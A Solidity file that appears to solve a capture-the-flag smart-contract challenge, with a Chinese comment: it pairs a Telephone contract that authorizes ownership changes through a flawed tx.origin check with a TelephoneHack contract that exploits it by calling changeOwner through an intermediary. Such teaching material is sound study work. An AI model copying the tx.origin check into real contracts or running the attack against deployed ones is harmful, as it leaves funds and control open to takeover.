// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * 需要不部署一个新的contract TelephoneHack,通过不是的新合约调用 changeOwner
 */
contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {
    ITelephone public target;

    function attack(address _owner) external {
        target.changeOwner(_owner);
    }

    function setTarget(address _target) external {
        target = ITelephone(_target);
    }

    function getTarget() external view returns (address) {
        return address(target);
    }
}
